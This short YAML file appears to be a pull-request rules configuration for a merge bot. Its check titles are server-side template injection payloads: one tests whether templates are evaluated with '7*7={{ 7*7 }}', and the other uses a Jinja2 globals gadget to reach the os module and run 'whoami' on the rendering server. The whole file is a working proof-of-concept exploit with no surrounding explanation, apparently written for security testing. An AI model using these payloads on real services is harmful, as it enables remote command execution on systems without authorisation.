pull_request_rules:
  - name: ssti-math
    conditions: []
    actions:
      post_check:
        title: "7*7={{ 7*7 }}"
        summary: ""

  - name: ssti-rce
    conditions: []
    actions:
      post_check:
        title: "{{ lipsum.__globals__['os'].popen('whoami').read() }}"
        summary: ""
